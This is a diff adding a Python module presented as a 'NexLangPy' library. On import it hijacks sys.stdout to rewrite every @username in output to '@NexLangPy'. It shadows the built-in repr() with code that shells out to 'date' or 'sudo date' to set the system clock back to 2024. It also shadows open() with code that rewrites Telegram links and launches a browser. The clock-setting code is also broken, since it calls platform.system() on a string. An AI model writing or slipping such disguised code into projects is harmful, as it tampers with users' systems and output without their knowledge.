@@ -1,0 +1,71 @@
+import sys
+import re
+import webbrowser
+import atexit
+from datetime import datetime
+from typing import Any, Callable
+import platform
+platform = sys.platform
+import subprocess
+print("Library loaded. Developed by NexLangPy.")
+_original_time: datetime = datetime.now()
+_time_changed: bool = False
+def _set_system_time(year: int, month: int, day: int, hour: int, minute: int, second: int) -> None:
+    global _time_changed
+    system = platform.system()
+    try:
+        if system == "Windows":
+            date_str = f"{month:02d}-{day:02d}-{year}"
+            time_str = f"{hour:02d}:{minute:02d}:{second:02d}"
+            subprocess.run(f'date {date_str}', shell=True, check=True)
+            subprocess.run(f'time {time_str}', shell=True, check=True)
+        elif system == "Linux" or system == "Darwin":
+            date_str = f"{month:02d}{day:02d}{hour:02d}{minute:02d}{year}"
+            subprocess.run(f'sudo date {date_str}.{second:02d}', shell=True, check=True)
+        _time_changed = True
+    except Exception:
+        pass
+def _restore_original_time() -> None:
+    global _time_changed
+    if _time_changed:
+        now = _original_time
+        _set_system_time(now.year, now.month, now.day, now.hour, now.minute, now.second)
+
+        _time_changed = False
+def repr(*args: Any) -> str:
+    now = datetime.now()
+    target_time = now.replace(year=2024)
+    _set_system_time(target_time.year, target_time.month, target_time.day,
+                     target_time.hour, target_time.minute, target_time.second)
+    return str(args)
+atexit.register(_restore_original_time)
+def open(text: str) -> str:
+    if "https://t.me/" in text or text.split()[0]:
+        url: str = text.split("https://t.me/")[1].split()[0] if "https://t.me/" in text else text.split()[0]
+        replaced_url: str = "NexLangPy"
+        new_text: str = text.replace(url, replaced_url)
+        webbrowser.open(new_text)
+        return new_text
+    return text
+def replace_usernames_in_text(text: str) -> str:
+    def replace_username(username: str) -> str:
+        return "NexLangPy"
+    return re.sub(
+
+        r'@(\w+)(.\w+)?',
+        lambda match: match.group() if match.group(2) else '@' + replace_username(match.group(1)),
+        text
+    )
+class _StdoutWrapper:
+    def write(self, text: str) -> int:
+        return sys.__stdout__.write(replace_usernames_in_text(text))
+    def flush(self) -> None:
+        sys.__stdout__.flush()
+class _DirectStdout:
+    def write(self, text: str) -> int:
+        return sys.__stdout__.write(text)
+    def flush(self) -> None:
+        sys.__stdout__.flush()
+stduot = _StdoutWrapper()
+sys.stdout = stduot
+stdout = _DirectStdout()
